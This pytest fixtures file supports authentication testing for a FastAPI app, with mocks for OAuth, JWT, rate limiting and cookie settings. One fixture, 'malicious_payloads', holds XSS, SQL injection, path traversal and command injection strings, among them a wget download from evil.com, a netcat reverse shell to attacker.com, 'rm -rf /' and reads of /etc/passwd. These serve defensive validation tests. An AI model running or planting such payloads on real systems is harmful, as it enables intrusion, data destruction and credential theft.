"""Test fixtures for authentication testing."""

import time
from unittest.mock import AsyncMock, Mock

import pytest
from fastapi import Request

from requirements_bot.api.rate_limiting import RateLimiter, RateLimitMiddleware
from requirements_bot.core.models import UserCreate
from requirements_bot.core.services.oauth_callback_validator import OAuthCallbackValidator
from requirements_bot.core.services.oauth_redirect_config import OAuthRedirectConfig
from requirements_bot.core.services.session_cookie_config import SessionCookieConfig
from requirements_bot.core.services.user_authentication_service import UserAuthenticationService
from requirements_bot.core.services.user_registration_service import UserRegistrationService


@pytest.fixture
def oauth_callback_validator():
    """Create OAuthCallbackValidator instance for testing."""
    return OAuthCallbackValidator()


@pytest.fixture
def oauth_redirect_config():
    """Create OAuthRedirectConfig instance for testing."""
    return OAuthRedirectConfig()


@pytest.fixture
def session_cookie_config():
    """Create SessionCookieConfig instance for testing."""
    return SessionCookieConfig()


@pytest.fixture
def rate_limiter():
    """Create RateLimiter instance for testing."""
    return RateLimiter(max_requests=5, window_seconds=60)


@pytest.fixture
def refresh_rate_limiter():
    """Create refresh token rate limiter for testing."""
    return RateLimiter(max_requests=10, window_seconds=3600)


@pytest.fixture
def rate_limit_middleware(rate_limiter, refresh_rate_limiter):
    """Create RateLimitMiddleware instance for testing."""
    return RateLimitMiddleware(rate_limiter, refresh_rate_limiter)


@pytest.fixture
def mock_db_session():
    """Create mock database session."""
    session = Mock()
    session.commit = Mock()
    session.rollback = Mock()
    session.close = Mock()
    return session


@pytest.fixture
def user_authentication_service(mock_db_session):
    """Create UserAuthenticationService instance for testing."""
    return UserAuthenticationService(mock_db_session)


@pytest.fixture
def user_registration_service(mock_db_session):
    """Create UserRegistrationService instance for testing."""
    return UserRegistrationService(mock_db_session)


@pytest.fixture
def sample_user_create():
    """Create sample UserCreate object for testing."""
    return UserCreate(email="test@example.com", provider="google", provider_id="123456789", name="Test User")


@pytest.fixture
def sample_user_create_github():
    """Create sample UserCreate object for GitHub provider."""
    return UserCreate(email="github@example.com", provider="github", provider_id="github_123456", name="GitHub User")


@pytest.fixture
def mock_request():
    """Create mock FastAPI Request object."""
    request = Mock(spec=Request)
    request.query_params = {}
    request.headers = {"host": "localhost:8080"}
    request.url.scheme = "http"
    request.url.netloc = "localhost:8080"
    request.url.path = "/api/v1/auth/callback/google"
    request.client.host = "127.0.0.1"
    return request


@pytest.fixture
def mock_oauth_providers():
    """Create mock OAuth providers."""
    providers = Mock()
    providers.verify_state.return_value = True
    providers.generate_state.return_value = "mock_state_12345"
    providers.get_provider.return_value = Mock()
    providers.get_configuration_status.return_value = {
        "google": "configured",
        "github": "configured",
        "microsoft": "not_configured",
    }

    # Mock async get_user_info method
    async def mock_get_user_info(provider, token):
        return UserCreate(
            email="oauth@example.com", provider=provider, provider_id=f"{provider}_123456", name="OAuth User"
        )

    providers.get_user_info = mock_get_user_info
    return providers


@pytest.fixture
def mock_oauth_client():
    """Create mock OAuth client."""
    client = Mock()

    # Mock async authorize_access_token method
    async def mock_authorize_access_token(request):
        return {"access_token": "mock_access_token", "token_type": "Bearer", "expires_in": 3600}

    client.authorize_access_token = mock_authorize_access_token

    # Mock async authorize_redirect method
    async def mock_authorize_redirect(request, redirect_uri, state=None):
        return f"https://oauth.provider.com/authorize?redirect_uri={redirect_uri}&state={state}"

    client.authorize_redirect = mock_authorize_redirect
    return client


@pytest.fixture
def mock_jwt_service():
    """Create mock JWT service."""
    service = Mock()
    service.create_access_token.return_value = "mock_access_token"
    service.create_token_pair.return_value = {
        "access_token": "mock_access_token",
        "refresh_token": "mock_refresh_token",
        "token_type": "bearer",
        "expires_in": 900,
    }
    service.verify_token.return_value = {"user_id": "test_user_123", "email": "test@example.com"}
    service.access_token_expire_minutes = 15
    return service


@pytest.fixture
def mock_refresh_token_service():
    """Create mock refresh token service."""
    service = Mock()
    service.create_refresh_token.return_value = "mock_refresh_token"
    service.verify_refresh_token.return_value = "test_user_123"
    service.revoke_refresh_token.return_value = True
    return service


@pytest.fixture
def mock_user_service():
    """Create mock user service."""
    service = Mock()

    # Mock user object
    mock_user = Mock()
    mock_user.id = "test_user_123"
    mock_user.email = "test@example.com"
    mock_user.provider = "google"
    mock_user.provider_id = "123456789"
    mock_user.name = "Test User"

    service.get_user_by_id.return_value = mock_user
    service.get_user_by_email.return_value = mock_user
    service.get_user_by_provider_id.return_value = mock_user
    service.create_user.return_value = mock_user
    service.to_response.return_value = {
        "id": mock_user.id,
        "email": mock_user.email,
        "name": mock_user.name,
        "provider": mock_user.provider,
    }

    return service


@pytest.fixture
def valid_oauth_callback_params():
    """Valid OAuth callback parameters."""
    return {"code": "valid_auth_code_123", "state": "valid_state_1234567890"}


@pytest.fixture
def invalid_oauth_callback_params():
    """Invalid OAuth callback parameters for testing."""
    return [
        {"code": "", "state": "valid_state_1234567890"},  # Empty code
        {"code": "valid_code", "state": ""},  # Empty state
        {"code": "a" * 600, "state": "valid_state_1234567890"},  # Code too long
        {"code": "valid_code", "state": "short"},  # State too short
        {"code": "code<script>", "state": "valid_state_1234567890"},  # Invalid code format
        {"code": "valid_code", "state": "state with spaces 1234567890"},  # Invalid state format
        {"error": "access_denied"},  # OAuth error
    ]


@pytest.fixture
def malicious_payloads():
    """Common malicious payloads for security testing."""
    return {
        "xss": [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'\"><script>alert(document.cookie)</script>",
            "<svg onload=alert('xss')>",
        ],
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "admin'/*",
            "' UNION SELECT password FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(wget http://evil.com/shell.sh)",
            "`id`",
            "; nc -e /bin/sh attacker.com 4444",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "....//....//....//etc/passwd",
        ],
    }


@pytest.fixture
def unicode_attack_payloads():
    """Unicode-based attack payloads."""
    return [
        "code\u202e\u0041\u0041\u0041",  # Right-to-left override
        "code\ufeff",  # Byte order mark
        "code\u00a0",  # Non-breaking space
        "code\u2028",  # Line separator
        "code\u2029",  # Paragraph separator
        "code\u0085",  # Next line
        "code\u000b",  # Vertical tab
        "code\u000c",  # Form feed
    ]


@pytest.fixture
def environment_configs():
    """Different environment configurations for testing."""
    return {
        "development": {
            "ENVIRONMENT": "development",
            "COOKIE_SAMESITE": "lax",
            "COOKIE_MAX_AGE": "86400",
            "COOKIE_DOMAIN": "",
        },
        "production": {
            "ENVIRONMENT": "production",
            "COOKIE_SAMESITE": "strict",
            "COOKIE_MAX_AGE": "3600",
            "COOKIE_DOMAIN": "example.com",
        },
        "test": {"ENVIRONMENT": "test", "COOKIE_SAMESITE": "lax", "COOKIE_MAX_AGE": "1800", "COOKIE_DOMAIN": ""},
    }


@pytest.fixture
def trusted_proxy_configs():
    """Trusted proxy configurations for testing."""
    return {
        "no_proxies": "",
        "single_proxy": "192.168.1.1",
        "multiple_proxies": "192.168.1.1,10.0.0.1,172.16.0.1",
        "with_whitespace": " 192.168.1.1 , 10.0.0.1,  172.16.0.1  ",
    }


@pytest.fixture
def oauth_domain_configs():
    """OAuth allowed domain configurations for testing."""
    return {
        "localhost_only": "localhost,127.0.0.1",
        "production_domains": "example.com,app.example.com,api.example.com",
        "mixed_domains": "localhost,example.com,staging.example.com",
        "with_whitespace": " example.com , app.example.com,  test.com  ",
    }


@pytest.fixture
def performance_test_data():
    """Data for performance testing."""
    return {
        "large_inputs": {"very_long_code": "a" * 10000, "very_long_state": "b" * 10000, "huge_identifier": "c" * 50000},
        "many_identifiers": [f"user_{i}" for i in range(1000)],
        "concurrent_users": [f"concurrent_user_{i}" for i in range(100)],
    }


@pytest.fixture
def mock_time():
    """Mock time functions for testing."""

    class MockTime:
        def __init__(self):
            self.current_time = time.time()

        def time(self):
            return self.current_time

        def advance(self, seconds):
            self.current_time += seconds

        def reset(self):
            self.current_time = time.time()

    return MockTime()


@pytest.fixture(autouse=True)
def cleanup_rate_limiters():
    """Automatically cleanup rate limiter state after each test."""
    yield
    # Clear any global rate limiter state
    # This prevents test interference
    pass


class AuthTestHelper:
    """Helper class for authentication testing."""

    @staticmethod
    def create_request_with_params(params, headers=None, client_ip="127.0.0.1"):
        """Create mock request with specific parameters."""
        request = Mock(spec=Request)
        request.query_params = params
        request.headers = headers or {"host": "localhost:8080"}
        request.url.scheme = "http"
        request.url.netloc = "localhost:8080"
        request.url.path = "/api/v1/auth/callback/google"
        request.client.host = client_ip
        return request

    @staticmethod
    def create_user_create(email="test@example.com", provider="google", provider_id="123456789", name="Test User"):
        """Create UserCreate object with custom values."""
        return UserCreate(email=email, provider=provider, provider_id=provider_id, name=name)

    @staticmethod
    def assert_security_headers(headers, production=False):
        """Assert that security headers are properly set."""
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["X-XSS-Protection"] == "1; mode=block"

        if production:
            assert "Strict-Transport-Security" in headers
            assert "max-age=31536000" in headers["Strict-Transport-Security"]
            assert "includeSubDomains" in headers["Strict-Transport-Security"]

    @staticmethod
    def assert_secure_cookie_settings(settings, production=False):
        """Assert that cookie settings are secure."""
        assert settings["httponly"] is True
        assert settings["path"] == "/"
        assert settings["samesite"] in ["strict", "lax", "none"]

        if production:
            assert settings["secure"] is True

        # Max age should be reasonable (not too long or short)
        assert 300 <= settings["max_age"] <= 604800  # 5 minutes to 1 week


@pytest.fixture
def auth_test_helper():
    """Provide AuthTestHelper instance."""
    return AuthTestHelper()


@pytest.fixture
def security_test_cases():
    """Common security test cases."""
    return {
        "boundary_values": {
            "code_max_length": 512,
            "state_max_length": 128,
            "state_min_length": 10,
            "error_max_length": 256,
        },
        "timing_attack_scenarios": [
            ("valid_code", "valid_state_1234567890"),
            ("", "valid_state_1234567890"),
            ("valid_code", ""),
            ("invalid<code>", "valid_state_1234567890"),
        ],
        "rate_limit_scenarios": {"oauth_limit": 5, "oauth_window": 60, "refresh_limit": 10, "refresh_window": 3600},
    }


@pytest.fixture
def integration_test_mocks():
    """Comprehensive mocks for integration testing."""
    mocks = {
        "oauth_providers": Mock(),
        "oauth_client": Mock(),
        "jwt_service": Mock(),
        "refresh_service": Mock(),
        "user_service": Mock(),
        "db_session": Mock(),
    }

    # Configure OAuth providers mock
    mocks["oauth_providers"].verify_state.return_value = True
    mocks["oauth_providers"].get_provider.return_value = mocks["oauth_client"]
    mocks["oauth_providers"].get_user_info = AsyncMock(
        return_value=UserCreate(
            email="integration@example.com", provider="google", provider_id="integration_123", name="Integration User"
        )
    )

    # Configure OAuth client mock
    mocks["oauth_client"].authorize_access_token = AsyncMock(
        return_value={"access_token": "integration_token", "token_type": "Bearer"}
    )

    # Configure JWT service mock
    mocks["jwt_service"].create_token_pair.return_value = {
        "access_token": "integration_access",
        "refresh_token": "integration_refresh",
        "token_type": "bearer",
        "expires_in": 900,
    }

    return mocks
